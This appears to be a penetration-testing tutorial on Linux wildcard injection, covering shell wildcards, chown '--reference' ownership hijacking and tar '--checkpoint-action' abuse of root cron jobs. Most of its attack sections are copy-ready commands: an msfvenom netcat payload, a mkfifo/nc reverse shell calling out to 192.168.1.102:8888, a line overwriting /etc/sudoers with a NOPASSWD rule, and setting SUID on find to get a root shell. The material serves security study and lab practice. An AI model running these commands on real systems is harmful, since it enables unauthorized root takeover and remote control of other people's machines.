- Wildcards are special characters used in the context of file manipulation and searching within a computer's command-line interface (shell).
- They help you perform operations on files or locate files that match certain patterns of characters.
- Wildcards are interpreted by the shell before any other action is taken.

#### Some Wildcards character:
1. **Asterisk (`*`)**:
	- This wildcard represents any number of characters, including none.
	- For example, if you want to find all files with a ".txt" extension, you can use the wildcard like this: `*.txt`, and it will match any file that ends with ".txt."

2. **Question Mark (?)**:
	- The question mark matches a single character.
	- For instance, if you want to find a file with a name like "file1.txt" but you're not sure about the character in the middle, you can use a wildcard like this: `file?.txt`, and it will match "file1.txt," "file2.txt," and so on.

3. **Square Brackets [ ]**:
	- Brackets enclose a set of characters, and any one of those characters can match a single character at that position.
	- For example, if you want to find files that could be either "fileA.txt" or "fileB.txt," you can use the wildcard like this: `file[A-B].txt`. It matches either "fileA.txt" or "fileB.txt."

4. **Hyphen (-)**:
	- A hyphen used within square brackets denotes a range of characters.
	- For example, `[0-9]` would match any single digit from 0 to 9. So, if you want to find files with names like "file1.txt," "file2.txt," etc., you can use the wildcard like this: `file[0-9].txt`.

5. **Tilde (~)**:
	- When a tilde is at the beginning of a word in the shell, it typically expands to represent the name of your home directory.
	- For example, if your username is "user1," then `~` would refer to the home directory of "user1." If you use `~user2`, it would refer to the home directory of "user2."

#### Example of Wildcard wildness

##### 1st Example

>draw your attention to the below steps.
```shell
cd /Desktop
mkdir wild
cd wild
echo "Hello Friends" > file1
echo "This is Wildcard Injection" > file2
echo "take help" > --help
```
So as you can observe, here we have made a new directory “wild” on the desktop then with help of the echo command we have created 3 files and written 1 line in each file.


>Afterwards, with help of the cat command, we try to open all the above 3 files as shown:
```shell
cat file1
cat file 2
cat --help
```
- However, the first two files opened normally and show the same information as written above. But the cat command failed to read information written inside –help file.
- Instead of showing “take help” while opening –help file it calls its own –help options from its own libraries & such type of trick is called **Wildcard wildness**.
![[linux_privesc28.png]]


### File owner hijacking via Chown
   It is used on Unix-like systems to modify the ownership of file system files, directories and it may only be changed by a super-user.

   Super-user (**root**) – perform an admin-level task such as run chown command.

   Non-root-user1 (**raj**) – perform ordinary jobs such as create file

   Non-root-user2 (**aarti**) – perform ordinary jobs such as create file

   Mischief-user (**Ignite**) – perform a notorious task such as the Chown file reference trick that can lead to file owner hijacking.

>In the following image, you can observe all the PHP file is owned by user: raj. 
![[linux_privesc29.png]]


Now when the user: ignite found all PHP file is own by user raj then he induces two PHP file himself in the same directory and uses file reference trick for file owner hijacking by executing below commands.
```shell
ls -al
echo "" > my.php
echo > --reference=my.php
```
- when the super-user will be supposed to change ownership of all file having PHP extension with help of wildcard, then all files will indirectly come under the ownership of user: ignite.


>As you can observe when root user run chown command to give ownership to all the PHP files to the user: aarti, an error occurred and as result, the all PHP file get seized by user: ignite automatically.
```shell
chown -R aarti:aarti *.php
ls -al
```
**Conceptual Information**: The `chown` command has an option `--reference=RFILE` that allows you to use the owner and group from a reference file (`RFILE`) instead of specifying them explicitly. In this case, the attacker used this feature in a tricky way to change ownership.
```shell
echo "" > my.php
echo > --reference=my.php
```


Then root user takes the help of the wildcard character for changing ownership. Thing is that the wildcard character used in ‘chown’ command line took the subjective ‘–reference=.my.php’ file and passed it to the chown command at the command line as an option.
![[linux_privesc30.png]]


### Post Exploitation via tar (Phase I)
   Tar is a very common UNIX program for creating and extracting archives. And with help of it, we are going to take a compress backup of any directory.

   For example, make a new directory and give ALL permission to it and then create some files.
```shell
mkdir html
chmod 777 html
cd html
touch index.html
touch raj
touch file.txt   
```
![[linux_privesc31.png]]

**Now schedule a task with help of crontab to run tar archival program for taking backup of /html from inside /var/backups in every 1 minute.**
```shell
nano /etc/crontab
*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
```

![[linux_privesc32.png]]

**Let’s verify the schedule is working or not by executing the following command.**
```shell
cd /var/backup
ls
```
![[linux_privesc33.png]]

#### Tar Wildcard Injection (1st method)
   - Start your attacking machine and first compromise the target system and then move to the privilege escalation stage.
   - Suppose I successfully login into the victim’s machine through ssh and access the non-root user terminal.

Then open crontab to view if any job is scheduled.
```shell
cat /etc/crontab
```

**Here we notice the target has scheduled a tar archival program for every 1 minute and we know that cron job runs as root**
![[linux_privesc34.png]]


>On a new terminal generate netcat reverse shell malicious code for achieving netcat reverse connection by using msfvenom and enter the following command for that.
```shell
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R
```

**Run the below command on another terminal**
```python
nc -lvp 8888
```


**Copy the generated payload and paste it inside the victim’s shell as described below.**
![[linux_privesc35.png]]


**Now paste the above-copied payload as described below and ran the following commands inside the victim’s tty shell.**
```shell
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```

![[linux_privesc36.png]]
- The above commands help the tar command to run the file shell.sh after the first file is archived.
- Since the tar command is running as root due to crontab, this has the effect of spawning a netcat shell and sending it to the attack platform on port 8888.

**And if you go back to the terminal window where the listener was on, you will have victim’s reverse connection in after 1 minute.**
```shell
id
whoami
```

##### Conceptual Information:

   If you have ever explored tar to read its optional switches then you will find the following option.

   1. **–checkpoint=[`NUMBER`]**
	- This option is used to control how often progress messages are displayed while `tar` is working.
	- It has an optional `NUMBER` parameter, but if you don't provide it, the default value is 10.
	- So, it's like telling `tar` to provide updates on its progress every `NUMBER` records/files it processes.
	- These progress messages help you track how far along the `tar` operation is and how many files have been processed.

   2. **--checkpoint-action=ACTION**
	- This option allows you to specify an `ACTION` that `tar` should perform every time it reaches a checkpoint (as determined by the `--checkpoint` option).
	- You can define various actions that `tar` should take when it reaches a checkpoint, like running a custom script or performing some task.
	- This is useful for executing specific actions or scripts at different stages of a `tar` operation, providing more control over the process.


There is a ‘–checkpoint-action’ option, that will specify the program which will be executed when the checkpoint is reached. Mainly, this permits us to run an arbitrary command. 

Hence Options ‘–checkpoint=1’ and ‘–checkpoint-action=exec=sh shell.sh’ are handed to the ‘tar’ program as command-line options.
![[linux_privesc37.png]]

### Post Exploitation via tar (Phase II)
**Lab Setup**
   - In this phase, with the help of tar, we are going to take a compress backup of a directory.
   - For example, make a new directory whose backup you wish to take and give ALL permission to it and then create some files.
```shell
cd /tmp
mkdir data
chmod 777 data
cd data
echo "" > f1
echo "" > f2
echo "" > f3
ls
```

![[linux_privesc38.png]]


**Now in the other directory write a bash script for taking backup of /tmp/data with help of tar archive program.**
```shell
mkdir info
cd info
nano script.sh
chmod 777 script.sh
```

![[linux_privesc39.png]]

>Bash script
```shell
#!/bin/bash
cd /tmp/data
tar cf /info/backup.tgz *
```

![[linux_privesc40.png]]

>Now schedule a task with help of crontab to run tar archival program for taking backup of /html inside /var/backups in every 1 minute.
```shell
nano /etc/crontab                                   
*/1 *   * * *   root    /info/script.sh
```

![[linux_privesc41.png]]

>And after 1 minute you will notice the backup.tgz file is generated inside the info directory.
![[linux_privesc42.png]]


### Tar Wildcard Injection
   - Start your attacking machine and first compromise the target system and then move to the privilege escalation stage.
   - Suppose I successfully login into the victim’s machine through ssh and access non-root user terminal.
   - Then open crontab to view if any job is scheduled.
```shell
cat /etc/crontab   
```

![[linux_privesc43.png]]
  - Here we notice the target has scheduled a bash program script for every 1 minute and we know that cron job runs as root.
  - The minute attacker read the program written inside the script.sh, he can apply the tar wildcard injection.

**Again generate netcat reverse shell payload as done above.**
![[linux_privesc44.png]]

**And again repeat the above step as shown in the image.**
![[linux_privesc45.png]]


>Then get back to netcat shell for the victim’s reverse connection and you will notice after 1 minute you get victim’s netcat session.
```shell
whoami
cd /root
pwd
```


Hence, the target can be easily exploited if he makes a usage tar archive program either by scheduling a job via command or through bash script.
![[linux_privesc46.png]]


### Tar Wildcard Injection (2nd method)

**Exploit Sudoers file for Privilege Escalation**

   - Suppose you have victim’s machine as a non-root user and for privilege escalation either take root access or try to give sudo right to non-root user by adding him sudoers file.
   - Thus you can take help of following commands.
```shell
echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
echo "" > "--checkpoint-action=exec=sh demo.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```


>With the help of above command we had tried to give root permission to the user: ignite. After 1 minute passed we successfully owned the root account.
```shell
sudo -l
sudo bash
whoami
```

![[linux_privesc47.png]]

### Tar Wildcard Injection (3rd method)

**Privilege Escalation-Give SUID permission to system binaries**

Suppose you have victim’s machine as the non-root user and for privilege escalation, you can try to enable SUID bit for any system binaries and likewise above again,

>you can take help of the following command for obtaining root access.
```shell
echo "chmod u+s /usr/bin/find" > test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
ls -al /usr/bin/find
find f1 -exec "whoami" \;
root
find f1 -exec "/bin/sh" \;
id
whoami
```

>We Hope, you people will enjoy these tricks while penetration testing.
![[linux_privesc48.png]]
